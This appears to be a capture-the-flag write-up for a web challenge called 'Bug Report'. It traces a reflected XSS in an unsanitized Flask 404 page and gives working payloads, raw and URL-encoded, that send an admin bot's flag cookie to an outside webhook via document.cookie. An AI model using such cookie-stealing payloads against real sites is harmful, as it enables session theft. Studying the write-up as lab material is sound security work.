# Bug Report

Challenge text:
```
They say humans shall not take control to any of their resources. Can you prove them wrong without letting them know.
```
Along with the [source code](web_bug_report).

The website had an input form, where you could submit a URL and it would visit the site, with the flag set as a cookie. As it was a samesite cookie, you would need an XSS on the host website to be able to get the cookie.

By looking at the source I notice that for the 404 page, the URL is embedded without any sanitizing:
```py
@app.errorhandler(404)
def page_not_found(error): 
    return "<h1>URL %s not found</h1><br/>" % unquote(request.url), 404
```
By going to `/<script>alert(1)</script>`, I get an alert.

So I send the bot to the website `http://188.166.145.178:30190/<script>window.location="http://webhook?c="+document.cookie;</script>` (url-encoded), but I don't recieve a cookie. I'm a bit confused, as the cookie should definitely be set. After looking at the bot's source for a while, I notice that the the cookie is set at `127.0.0.1:1337`, and not the external IP.
```py
browser.get('http://127.0.0.1:1337/')

browser.add_cookie({
    'name': 'flag',
    'value': 'CHTB{f4k3_fl4g_f0r_t3st1ng}'
})

try:
    browser.get(url)
```

By sending `http://127.0.0.1:1337/%3Cscript%3Ewindow.location%3d%22http%3a//webhook%3fc%3d%22%2bdocument.cookie%3b%3C/script%3E`, I recieve the flag.